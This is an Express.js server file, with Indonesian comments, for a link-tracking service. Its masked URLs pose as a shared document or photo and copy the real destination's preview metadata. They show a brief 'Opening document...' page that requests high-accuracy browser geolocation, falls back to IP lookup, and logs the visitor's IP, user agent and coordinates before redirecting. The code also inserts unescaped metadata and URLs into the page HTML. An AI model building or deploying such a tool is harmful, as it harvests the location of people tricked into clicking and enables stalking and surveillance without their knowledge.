const express = require('express');
const { nanoid } = require('nanoid');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');
const dotenv = require('dotenv');
const getMetaData = require('metadata-scraper');
const fetch = require('node-fetch');
const fs = require('fs');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('MongoDB connection error:', err));

// MongoDB Schema and Models
const linkSchema = new mongoose.Schema({
    id: { type: String, required: true, unique: true },
    name: { type: String, required: true },
    custom_url: { type: String },
    custom_slug: { type: String },
    created_at: { type: Date, default: Date.now }
});

const visitSchema = new mongoose.Schema({
    link_id: { type: String, required: true, ref: 'Link' },
    latitude: { type: Number },
    longitude: { type: Number },
    ip_address: { type: String },
    user_agent: { type: String },
    city: { type: String },
    region: { type: String },
    country: { type: String },
    location_source: { type: String, enum: ['browser', 'ip', 'unknown'], default: 'unknown' },
    visited_at: { type: Date, default: Date.now }
});

const Link = mongoose.model('Link', linkSchema);
const Visit = mongoose.model('Visit', visitSchema);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static('public'));

// Fungsi untuk mendapatkan metadata dari URL
async function fetchUrlMetadata(url) {
    try {
        const metadata = await getMetaData(url);
        return {
            title: metadata.title || 'Shared Link',
            description: metadata.description || 'Click to open the link',
            image: metadata.image || '',
            url: url
        };
    } catch (error) {
        console.error('Error fetching metadata:', error);
        return {
            title: 'Shared Link',
            description: 'Click to open the link',
            image: '',
            url: url
        };
    }
}

// Fungsi untuk merender template HTML dengan metadata
function renderTemplate(templatePath, data) {
    let template = fs.readFileSync(templatePath, 'utf8');

    // Ganti placeholder dengan nilai sebenarnya
    Object.keys(data).forEach(key => {
        const placeholder = new RegExp(`{{${key}}}`, 'g');
        template = template.replace(placeholder, data[key]);
    });

    return template;
}

// Fungsi untuk mendapatkan lokasi berdasarkan IP address
async function getLocationFromIP(ip) {
    try {
        // Gunakan IP publik untuk testing jika IP adalah localhost atau IP pribadi
        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
            ip = '8.8.8.8'; // Gunakan IP Google sebagai fallback untuk testing
        }

        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();

        if (data && data.loc) {
            const [latitude, longitude] = data.loc.split(',');
            return {
                latitude: parseFloat(latitude),
                longitude: parseFloat(longitude),
                city: data.city,
                region: data.region,
                country: data.country,
                source: 'ip'
            };
        }
        return null;
    } catch (error) {
        console.error('Error getting location from IP:', error);
        return null;
    }
}

// API Routes

// Create a new tracking link
app.post('/api/links', async (req, res) => {
    try {
        const { name, customUrl, customSlug } = req.body;
        const id = customSlug || nanoid(8); // Use custom slug if provided, otherwise generate one

        console.log('Creating link:', { name, customUrl, customSlug, id });

        // Check if custom slug already exists
        if (customSlug) {
            const existingLink = await Link.findOne({ id: customSlug });
            if (existingLink) {
                return res.status(400).json({ error: 'Custom slug already in use. Please choose another one.' });
            }
        }

        // Create new link
        const link = new Link({
            id,
            name,
            custom_url: customUrl || null,
            custom_slug: customSlug || null
        });

        await link.save();

        // Generate tracking URLs
        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const standardTracking = `${baseUrl}/t/${id}`;

        // Generate masked URLs that don't reveal the actual domain
        const maskedUrl = `${baseUrl}/file/shared-document-${id.substring(0, 4)}.html`;
        const photoUrl = `${baseUrl}/photo/view-${id}.html`;

        const response = {
            id,
            name,
            custom_url: customUrl || null,
            url: standardTracking,
            masked_urls: {
                file: maskedUrl,
                photo: photoUrl
            }
        };

        console.log('Response:', response);
        res.status(201).json(response);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get all links
app.get('/api/links', async (req, res) => {
    try {
        const links = await Link.find().sort({ created_at: -1 });

        // Add masked URLs to each link
        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const linksWithUrls = links.map(link => {
            return {
                ...link.toObject(),
                url: `${baseUrl}/t/${link.id}`,
                masked_urls: {
                    file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                    photo: `${baseUrl}/photo/view-${link.id}.html`
                }
            };
        });

        res.json(linksWithUrls);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get a specific link with its visits
app.get('/api/links/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ id });

        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }

        const visits = await Visit.find({ link_id: id }).sort({ visited_at: -1 });

        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const response = {
            ...link.toObject(),
            url: `${baseUrl}/t/${link.id}`,
            masked_urls: {
                file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                photo: `${baseUrl}/photo/view-${link.id}.html`
            },
            visits
        };

        res.json(response);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Record a visit with location data
app.post('/api/track/:id', async (req, res) => {
    try {
        const { id } = req.params;
        console.log(`Tracking visit for link ID: ${id}`);
        console.log('Request body:', req.body);

        let { latitude, longitude, locationDenied } = req.body;
        const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const user_agent = req.headers['user-agent'];

        console.log('IP address:', ip_address);
        console.log('User agent:', user_agent);

        let locationSource = 'browser';
        let city = null;
        let region = null;
        let country = null;

        // Verify link exists
        const link = await Link.findOne({ id });
        if (!link) {
            console.error(`Link with ID ${id} not found`);
            return res.status(404).json({ error: 'Link not found' });
        }

        // Jika koordinat tidak tersedia atau lokasi ditolak, coba dapatkan dari IP
        if ((!latitude || !longitude || locationDenied) && ip_address) {
            console.log('Attempting to get location from IP:', ip_address);
            const ipLocation = await getLocationFromIP(ip_address);

            if (ipLocation) {
                latitude = ipLocation.latitude;
                longitude = ipLocation.longitude;
                city = ipLocation.city;
                region = ipLocation.region;
                country = ipLocation.country;
                locationSource = 'ip';
                console.log('Location from IP:', { latitude, longitude, city, country });
            } else {
                console.log('Failed to get location from IP');
            }
        } else {
            console.log('Using browser location:', { latitude, longitude });
        }

        // Buat entri kunjungan baru
        const visit = new Visit({
            link_id: id,
            latitude,
            longitude,
            ip_address,
            user_agent,
            city,
            region,
            country,
            location_source: locationSource
        });

        await visit.save();
        console.log('Visit recorded with ID:', visit._id);

        res.status(201).json({
            success: true,
            message: 'Visit recorded successfully',
            location: {
                source: locationSource,
                latitude,
                longitude,
                city,
                region,
                country
            }
        });
    } catch (error) {
        console.error('Server error in tracking:', error);
        res.status(500).json({ error: error.message });
    }
});

// Bagian script dari template HTML redirect
const redirectScript = `
<script>
    // Flag untuk memastikan kita hanya redirect sekali
    let hasRedirected = false;
    
    // Fungsi untuk melakukan redirect
    function doRedirect() {
        if (!hasRedirected) {
            hasRedirected = true;
            window.location.href = "{{REDIRECT_URL}}";
        }
    }
    
    // Timeout untuk memastikan redirect terjadi meski ada masalah
    // Tunggu 1500ms (1,5 detik) sebelum redirect
    setTimeout(doRedirect, 1500);
    
    // Function to send location data to the server
    function sendLocationData(position) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        };
        
        fetch('/api/track/{{LINK_ID}}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(locationData)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Location tracked:', data);
            // Redirect after data is sent successfully
            doRedirect();
        })
        .catch(error => {
            console.error('Error sending location data:', error);
            // Still redirect even if there was an error
            doRedirect();
        });
    }
    
    // Function to handle location error
    function handleLocationError(error) {
        console.error('Error getting location:', error);
        
        // Kirim data dengan indikasi lokasi ditolak
        fetch('/api/track/{{LINK_ID}}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ locationDenied: true })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Denial tracked:', data);
            doRedirect();
        })
        .catch(error => {
            console.error('Error sending location denial data:', error);
            doRedirect();
        });
    }
    
    // Request location immediately
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        });
    } else {
        // Browser tidak mendukung geolocation
        fetch('/api/track/{{LINK_ID}}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ locationDenied: true })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Fallback tracked:', data);
            doRedirect();
        })
        .catch(error => {
            console.error('Error sending fallback data:', error);
            doRedirect();
        });
    }
</script>
`;

// Redirect based on custom URL if available
app.get('/t/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ id });

        if (!link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (link.custom_url) {
            // Ambil metadata dari URL tujuan
            let ogMetadata = {
                title: link.name || 'Shared Link',
                description: 'Click to continue',
                image: '',
                url: link.custom_url
            };

            // Coba ambil metadata asli dari URL tujuan
            try {
                const metadata = await getMetaData(link.custom_url);
                if (metadata) {
                    ogMetadata.title = metadata.title || ogMetadata.title;
                    ogMetadata.description = metadata.description || ogMetadata.description;
                    ogMetadata.image = metadata.image || ogMetadata.image;
                    console.log('Metadata fetched:', ogMetadata);
                }
            } catch (metaError) {
                console.error('Error fetching metadata:', metaError);
                // Tetap gunakan default metadata jika terjadi error
            }

            // Prepare script with proper values
            const scriptWithValues = redirectScript
                .replace(/{{REDIRECT_URL}}/g, link.custom_url)
                .replace(/{{LINK_ID}}/g, id);

            // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
            const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${ogMetadata.title}</title>
                
                <!-- Open Graph / Facebook -->
                <meta property="og:type" content="website">
                <meta property="og:url" content="${ogMetadata.url}">
                <meta property="og:title" content="${ogMetadata.title}">
                <meta property="og:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="og:image" content="${ogMetadata.image}">` : ''}
                
                <!-- Twitter -->
                <meta property="twitter:card" content="summary_large_image">
                <meta property="twitter:url" content="${ogMetadata.url}">
                <meta property="twitter:title" content="${ogMetadata.title}">
                <meta property="twitter:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="twitter:image" content="${ogMetadata.image}">` : ''}
                
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background-color: #f8f9fa;
                    }
                    .container {
                        text-align: center;
                        padding: 20px;
                    }
                    .redirect-msg {
                        margin-bottom: 20px;
                    }
                    .loader {
                        border: 5px solid #f3f3f3;
                        border-radius: 50%;
                        border-top: 5px solid #3498db;
                        width: 30px;
                        height: 30px;
                        animation: spin 1s linear infinite;
                        margin: 10px auto;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="redirect-msg">Redirecting you to your destination...</div>
                    <div class="loader"></div>
                </div>
                ${scriptWithValues}
            </body>
            </html>
            `;
            res.send(html);
        } else {
            res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Handle file route for masked URLs
app.get('/file/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const idMatch = filename.match(/shared-document-(.{4})\.html/);

        if (!idMatch) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        const idPrefix = idMatch[1];

        // Find link with matching ID prefix
        const links = await Link.find();
        const matchedLink = links.find(link => link.id.startsWith(idPrefix));

        if (!matchedLink) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (matchedLink.custom_url) {
            // Ambil metadata dari URL tujuan
            let ogMetadata = {
                title: matchedLink.name || 'Shared Document',
                description: 'Click to open the document',
                image: '',
                url: matchedLink.custom_url
            };

            // Coba ambil metadata asli dari URL tujuan
            try {
                const metadata = await getMetaData(matchedLink.custom_url);
                if (metadata) {
                    ogMetadata.title = metadata.title || ogMetadata.title;
                    ogMetadata.description = metadata.description || ogMetadata.description;
                    ogMetadata.image = metadata.image || ogMetadata.image;
                }
            } catch (metaError) {
                console.error('Error fetching metadata:', metaError);
                // Tetap gunakan default metadata jika terjadi error
            }

            // Prepare script with proper values
            const scriptWithValues = redirectScript
                .replace(/{{REDIRECT_URL}}/g, matchedLink.custom_url)
                .replace(/{{LINK_ID}}/g, matchedLink.id);

            // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
            const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${ogMetadata.title}</title>
                
                <!-- Open Graph / Facebook -->
                <meta property="og:type" content="website">
                <meta property="og:url" content="${ogMetadata.url}">
                <meta property="og:title" content="${ogMetadata.title}">
                <meta property="og:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="og:image" content="${ogMetadata.image}">` : ''}
                
                <!-- Twitter -->
                <meta property="twitter:card" content="summary_large_image">
                <meta property="twitter:url" content="${ogMetadata.url}">
                <meta property="twitter:title" content="${ogMetadata.title}">
                <meta property="twitter:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="twitter:image" content="${ogMetadata.image}">` : ''}
                
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background-color: #f8f9fa;
                    }
                    .container {
                        text-align: center;
                        padding: 20px;
                    }
                    .redirect-msg {
                        margin-bottom: 20px;
                    }
                    .loader {
                        border: 5px solid #f3f3f3;
                        border-radius: 50%;
                        border-top: 5px solid #3498db;
                        width: 30px;
                        height: 30px;
                        animation: spin 1s linear infinite;
                        margin: 10px auto;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="redirect-msg">Opening document...</div>
                    <div class="loader"></div>
                </div>
                ${scriptWithValues}
            </body>
            </html>
            `;
            res.send(html);
        } else {
            res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Handle photo route for masked URLs
app.get('/photo/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const idMatch = filename.match(/view-(.+)\.html/);

        if (!idMatch) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        const id = idMatch[1];

        // Verify link exists
        const link = await Link.findOne({ id });
        if (!link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (link.custom_url) {
            // Ambil metadata dari URL tujuan
            let ogMetadata = {
                title: link.name || 'Shared Photo',
                description: 'Click to view the photo',
                image: '',
                url: link.custom_url
            };

            // Coba ambil metadata asli dari URL tujuan
            try {
                const metadata = await getMetaData(link.custom_url);
                if (metadata) {
                    ogMetadata.title = metadata.title || ogMetadata.title;
                    ogMetadata.description = metadata.description || ogMetadata.description;
                    ogMetadata.image = metadata.image || ogMetadata.image;
                }
            } catch (metaError) {
                console.error('Error fetching metadata:', metaError);
                // Tetap gunakan default metadata jika terjadi error
            }

            // Prepare script with proper values
            const scriptWithValues = redirectScript
                .replace(/{{REDIRECT_URL}}/g, link.custom_url)
                .replace(/{{LINK_ID}}/g, id);

            // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
            const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${ogMetadata.title}</title>
                
                <!-- Open Graph / Facebook -->
                <meta property="og:type" content="website">
                <meta property="og:url" content="${ogMetadata.url}">
                <meta property="og:title" content="${ogMetadata.title}">
                <meta property="og:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="og:image" content="${ogMetadata.image}">` : ''}
                
                <!-- Twitter -->
                <meta property="twitter:card" content="summary_large_image">
                <meta property="twitter:url" content="${ogMetadata.url}">
                <meta property="twitter:title" content="${ogMetadata.title}">
                <meta property="twitter:description" content="${ogMetadata.description}">
                ${ogMetadata.image ? `<meta property="twitter:image" content="${ogMetadata.image}">` : ''}
                
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background-color: #f8f9fa;
                    }
                    .container {
                        text-align: center;
                        padding: 20px;
                    }
                    .redirect-msg {
                        margin-bottom: 20px;
                    }
                    .loader {
                        border: 5px solid #f3f3f3;
                        border-radius: 50%;
                        border-top: 5px solid #3498db;
                        width: 30px;
                        height: 30px;
                        animation: spin 1s linear infinite;
                        margin: 10px auto;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="redirect-msg">Opening photo...</div>
                    <div class="loader"></div>
                </div>
                ${scriptWithValues}
            </body>
            </html>
            `;
            res.send(html);
        } else {
            res.redirect(`/track.html?id=${id}&type=photo`);
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Delete a tracking link
app.delete('/api/links/:id', async (req, res) => {
    try {
        const { id } = req.params;

        // Find and delete the link
        const link = await Link.findOneAndDelete({ id });

        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }

        // Delete all visits associated with this link
        await Visit.deleteMany({ link_id: id });

        res.json({ success: true, message: 'Link and associated visits deleted successfully' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Serve the main app for any other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// For Vercel, we need to export the Express app
module.exports = app;

// Only start the server if this file is run directly
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
} 